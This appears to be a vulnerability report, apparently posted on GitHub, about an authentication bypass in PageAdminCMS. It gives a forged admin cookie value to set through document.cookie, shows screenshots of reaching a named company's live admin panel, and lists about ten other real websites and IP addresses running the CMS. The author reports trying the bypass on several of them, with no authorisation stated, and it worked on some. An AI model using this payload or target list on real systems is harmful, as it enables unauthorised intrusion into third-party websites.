# Report on Unauthorized Access Vulnerability of Guangzhou Qidun Electronics Co., Ltd
Use fofa asset collection to enter the company's website: http://www.jinglingonline.com/index.aspx
![图片](https://user-images.githubusercontent.com/101256869/198198327-ee982682-9c69-4462-a968-d79d0ac23c32.png)
PageAdminCMS is used, which has an unauthorized access vulnerability.
After testing, the website uses the default management background/master
![图片](https://user-images.githubusercontent.com/101256869/198198475-1c656e75-dd93-47ee-a0ac-4c1c2c2f4304.png)
Design exp:

Master=1&LoginProcess=1&UserName=admin&LOginDate=1&Valicate=12b36e45c2df117d12a068814d826283f9c32f845e1589142208628b13f&Permissions=1

And then in the control of the input document.cookie="exp", then at the end of 35775; index.aspx. 
![图片](https://user-images.githubusercontent.com/101256869/198198554-360541df-3366-453f-973f-9a8490a90ac2.png)
Successfully entered the background
![图片](https://user-images.githubusercontent.com/101256869/198198585-82a8f9a0-2b7d-438b-be1a-f7cea7b1ad83.png)
Other assets:
http://106.14.6.92:8060/
http://101.200.152.103/index.aspx?lanmuid=63&sublanmuid=654
http://www.jnboiler.com/（PageAdminCMS3.0还存在SQL注入）
http://139.224.104.30:8082/
http://www.sxgczx.com/index.aspx
https://www.hugetech.com.cn/
http://localhost/e/master/login.aspx（http://www.nthssoft.com/e/）
http://122.112.240.202/e/master/login.aspx（http://www.sdhztx.com.cn/e/）
http://111.21.183.230:12345/e/master/login.aspx
http://sz-zr.com/e/master/login.aspx

Now test the other three assets

http://sz-zr.com/e/master/login.aspx
![图片](https://user-images.githubusercontent.com/101256869/198198678-40a72f9f-de9b-4a00-95dc-af8006ed6986.png)
![图片](https://user-images.githubusercontent.com/101256869/198198689-dba5b8b4-5186-4709-b236-ac283ba05fc7.png)
http://yixiong.cc:8082/e/master/login.aspx

The vendor has fixed the vulnerability

http://www.dibot.cn/master/login.aspx 
![图片](https://user-images.githubusercontent.com/101256869/198198744-dd70351e-1dcb-44a9-aad7-280257085477.png)

![图片](https://user-images.githubusercontent.com/101256869/198198760-8ea5d1b1-95f3-401a-82f2-7fe0dc05234d.png)

And successful

http://www.webwuxi.cn/master/login.aspx 
![图片](https://user-images.githubusercontent.com/101256869/198198803-5b4f8065-e943-44e4-a2e1-ecd9c9ed4cee.png)

![图片](https://user-images.githubusercontent.com/101256869/198198822-535e5435-6883-4599-9d21-5e09d4e6fe13.png)
